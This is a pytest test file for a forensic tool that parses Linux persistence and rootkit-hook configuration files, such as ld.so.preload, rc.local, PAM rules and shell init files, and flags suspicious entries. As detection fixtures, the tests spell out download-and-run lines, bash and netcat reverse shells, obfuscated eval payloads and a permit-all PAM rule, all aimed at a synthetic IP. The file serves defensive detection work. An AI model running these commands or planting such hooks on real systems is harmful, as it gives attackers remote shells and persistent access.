"""Linux persistence / rootkit-hook config parsing. Content and addresses are synthetic."""
from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from app.core import opensearch as os_module
from app.core.artifact_registry import ARTIFACT_REGISTRY
from app.ingest.artifact_normalizers import normalize_linux_row
from app.ingest.linux.discovery import build_linux_inventory
from app.ingest.linux.dispatch import parse_linux_artifact_file
from app.ingest.linux.helpers import looks_like_linux_artifact
from app.ingest.linux.persistence import parse_persistence, persistence_kind
from app.ingest.normalizer import base_document


def _doc(row: dict) -> dict:
    base = base_document("case-1", "ev-1", "art-1", row, {"artifact_type": row["artifact_family"]})
    return normalize_linux_row(base, row, source_path=row["source_file"], artifact_type=row["artifact_family"])


def _flags(content: str, path: str) -> list[list[str]]:
    return [row["suspicious_indicators"] for row in parse_persistence(content, source_path=path)]


# --------------------------------------------------------------------- detection

@pytest.mark.parametrize(
    "path, kind",
    [
        ("etc/ld.so.preload", "ld_so_preload"),
        ("etc/ld.so.conf", "ld_so_conf"),
        ("etc/ld.so.conf.d/custom.conf", "ld_so_conf"),
        ("etc/rc.local", "rc_local"),
        ("etc/rc.d/rc.local", "rc_local"),
        ("etc/pam.d/sshd", "pam_config"),
        ("var/spool/cron/atjobs/a00001019b1234", "at_job"),
        ("var/spool/at/a0000101", "at_job"),
        ("etc/profile", "shell_init"),
        ("etc/bash.bashrc", "shell_init"),
        ("etc/profile.d/custom.sh", "shell_init"),
        ("etc/update-motd.d/10-help-text", "shell_init"),
        ("home/alice/.bashrc", "shell_init"),
        ("home/alice/.bash_profile", "shell_init"),
        ("root/.profile", "shell_init"),
        ("root/.zshrc", "shell_init"),
        ("evidence/host1/etc/ld.so.preload", "ld_so_preload"),
    ],
)
def test_persistence_paths_are_detected(path, kind):
    assert persistence_kind(path) == kind
    assert looks_like_linux_artifact(path) == ("linux_persistence", kind, "linux_persistence_raw")


@pytest.mark.parametrize(
    "path",
    [
        "usr/share/doc/pkg/etc/pam.d/sample",
        "usr/share/base-files/profile",
        "home/alice/.bash_history",
        "home/alice/.bashrc.bak",
        "var/spool/cron/atjobs/.SEQ",
        "etc/pam.d",
        "etc/profile.d",
        "opt/app/etc/ld.so.preload.example",
    ],
)
def test_other_paths_are_not_persistence_config(path):
    assert persistence_kind(path) is None


@pytest.mark.parametrize("path, family", [("etc/pam.d/passwd", "linux_persistence"), ("etc/pam.d/group", "linux_persistence"), ("etc/passwd", "linux_identity")])
def test_pam_files_named_like_account_files_are_not_mistaken_for_them(path, family):
    assert looks_like_linux_artifact(path)[0] == family


# ------------------------------------------------------------------- ld.so.preload

def test_every_preload_entry_is_flagged_and_unusual_paths_more_so():
    rows = parse_persistence("# managed\n/lib/x86_64-linux-gnu/libfoo.so\n/dev/shm/.hook.so /tmp/x.so\n", source_path="etc/ld.so.preload")
    assert [r["library_path"] for r in rows] == ["/lib/x86_64-linux-gnu/libfoo.so", "/dev/shm/.hook.so", "/tmp/x.so"]
    assert rows[0]["suspicious_indicators"] == ["preload_library"]
    assert {"preload_library", "unusual_preload_path", "world_writable_path", "hidden_path"} <= set(rows[1]["suspicious_indicators"])
    assert "unusual_preload_path" in rows[2]["suspicious_indicators"]


def test_a_bare_library_name_is_unusual():
    assert "unusual_preload_path" in parse_persistence("libhook.so\n", source_path="etc/ld.so.preload")[0]["suspicious_indicators"]


def test_colon_separated_preload_entries():
    assert [r["library_path"] for r in parse_persistence("/usr/lib/liba.so:/usr/lib/libb.so\n", source_path="etc/ld.so.preload")] == ["/usr/lib/liba.so", "/usr/lib/libb.so"]


# ---------------------------------------------------------------------- scripts

def test_rc_local_download_and_run_is_flagged_and_boilerplate_is_not():
    content = "#!/bin/sh -e\n# rc.local\ncurl -s http://203.0.113.9/x | sh\nexit 0\n"
    rows = parse_persistence(content, source_path="etc/rc.local")
    assert [r["message"] for r in rows] == ["curl -s http://203.0.113.9/x | sh", "exit 0"]
    assert rows[0]["suspicious_indicators"] == ["download_and_run"] and rows[1]["suspicious_indicators"] == []
    assert [r["line_number"] for r in rows] == [3, 4]


@pytest.mark.parametrize(
    "line, indicator",
    [
        ("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "reverse_shell"),
        ("nc -e /bin/sh 203.0.113.9 4444", "reverse_shell"),
        ("echo ZWNobyBoaQ== | base64 -d | sh", "obfuscation"),
        ('eval "$(curl -s http://203.0.113.9/p)"', "obfuscation"),
        ("python3 -c 'import os; os.system(\"id\")'", "inline_interpreter"),
        ("/tmp/.cache/agent --daemon &", "hidden_path"),
        ("/dev/shm/run.sh", "world_writable_path"),
        ("export LD_PRELOAD=/usr/lib/x.so", "ld_preload_set"),
        ("PROMPT_COMMAND='logger x'", "prompt_command_hook"),
        ("alias sudo='/opt/wrap'", "shadowed_command_alias"),
    ],
)
def test_indicator_vocabulary(line, indicator):
    assert indicator in parse_persistence(line + "\n", source_path="home/alice/.bashrc")[0]["suspicious_indicators"]


@pytest.mark.parametrize(
    "line",
    ["export PATH=$PATH:/usr/local/bin", "alias ll='ls -alF'", "if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases; fi", "umask 022", "echo \"Welcome\"", "HISTSIZE=1000"],
)
def test_ordinary_shell_init_lines_are_not_flagged(line):
    assert parse_persistence(line + "\n", source_path="etc/profile")[0]["suspicious_indicators"] == []


def test_owner_comes_from_the_path():
    assert parse_persistence("echo hi\n", source_path="home/alice/.profile")[0]["username"] == "alice"
    assert parse_persistence("echo hi\n", source_path="root/.bashrc")[0]["username"] == "root"
    assert parse_persistence("echo hi\n", source_path="etc/profile")[0]["username"] is None


def test_at_job_content_is_parsed_line_by_line():
    rows = parse_persistence("#!/bin/sh\ncd /home/alice\nwget -q http://203.0.113.9/a -O- | sh\n", source_path="var/spool/cron/atjobs/a0000101")
    assert [r["artifact_type"] for r in rows] == ["at_job", "at_job"]
    assert "download_and_run" in rows[1]["suspicious_indicators"]


# -------------------------------------------------------------------------- PAM

def test_pam_rules_are_split_into_fields():
    rows = parse_persistence("@include common-auth\nauth [success=1 default=ignore] pam_unix.so nullok\n-session optional pam_systemd.so\n", source_path="etc/pam.d/login")
    assert rows[0]["pam_module"] == "@include common-auth"
    assert (rows[1]["pam_type"], rows[1]["pam_control"], rows[1]["pam_module"], rows[1]["pam_args"]) == ("auth", "[success=1 default=ignore]", "pam_unix.so", "nullok")
    assert rows[2]["pam_type"] == "session" and rows[2]["pam_module"] == "pam_systemd.so"
    assert all(r["suspicious_indicators"] == [] for r in rows)


def test_weakening_pam_rules_are_flagged():
    flags = _flags("auth sufficient pam_permit.so\nauth optional pam_exec.so /usr/local/bin/hook\nauth optional /tmp/pam_x.so\naccount required pam_permit.so\n", "etc/pam.d/sshd")
    assert flags[0] == ["auth_always_permit"]
    assert "pam_exec" in flags[1]
    assert {"nonstandard_pam_module", "world_writable_path"} <= set(flags[2])
    assert flags[3] == []  # pam_permit as a plain account rule is routine


# -------------------------------------------------------------------- normalizing

def test_unusual_preload_is_high_severity_and_titled():
    doc = _doc(parse_persistence("/dev/shm/.hook.so\n", source_path="etc/ld.so.preload")[0])
    assert doc["event"]["severity"] == "high"
    assert doc["event"]["type"] == "ld_so_preload" and doc["event"]["action"] == "persistence_ld_so_preload"
    assert doc["title"] == "ld so preload: /dev/shm/.hook.so"
    assert doc["linux"]["library_path"] == "/dev/shm/.hook.so"
    assert "unusual_preload_path" in doc["linux"]["suspicious_indicators"]


def test_a_flagged_line_is_medium_and_an_ordinary_one_is_info():
    flagged = _doc(parse_persistence("curl -s http://203.0.113.9/x | sh\n", source_path="etc/rc.local")[0])
    plain = _doc(parse_persistence("exit 0\n", source_path="etc/rc.local")[0])
    assert (flagged["event"]["severity"], plain["event"]["severity"]) == ("medium", "info")


def test_config_snapshots_have_no_invented_time():
    row = parse_persistence("exit 0\n", source_path="etc/rc.local")[0]
    assert row["timestamp"] is None and row["timestamp_status"] == "missing"


def test_pam_row_normalizes_module_fields():
    doc = _doc(parse_persistence("auth sufficient pam_permit.so\n", source_path="etc/pam.d/sshd")[0])
    assert doc["linux"]["pam_module"] == "pam_permit.so" and doc["linux"]["pam_type"] == "auth"
    assert doc["event"]["severity"] == "medium"


# ----------------------------------------------------------- dispatch/registry/map

def test_dispatch_parses_the_file(tmp_path):
    path = tmp_path / "ld.so.preload"
    path.write_text("/tmp/x.so\n")
    rows = parse_linux_artifact_file(path, parser="linux_persistence_raw", artifact_type="ld_so_preload", source_path="etc/ld.so.preload")
    assert len(rows) == 1 and rows[0]["library_path"] == "/tmp/x.so"


def test_registry_and_inventory_know_persistence():
    entry = ARTIFACT_REGISTRY["linux_persistence"]
    assert entry["parser"] == "linux_persistence_raw" and entry["view"] == "persistence" and entry["timeline_capable"] is False
    inventory = build_linux_inventory(Path("."), ["etc/ld.so.preload", "etc/pam.d/sshd"])
    assert [i["key"] for i in inventory["detected_artifacts"]] == ["persistence"]


@pytest.mark.parametrize("exists", [False, True], ids=["new-index", "existing-index-backfill"])
def test_new_fields_are_declared_in_the_index_mapping(monkeypatch, exists):
    client = MagicMock()
    monkeypatch.setattr(os_module, "get_opensearch_client", lambda **_: client)
    monkeypatch.setattr(os_module, "index_exists", lambda *_a, **_k: exists)
    monkeypatch.setattr(os_module, "_apply_safe_index_settings", lambda *_a, **_k: None, raising=False)
    os_module.ensure_case_index("11111111-1111-4111-8111-111111111111")
    call = client.indices.put_mapping if exists else client.indices.create
    body = call.call_args.kwargs["body"]
    assert {"library_path", "pam_module", "suspicious_indicators"} <= set(body.get("mappings", body)["properties"]["linux"]["properties"])
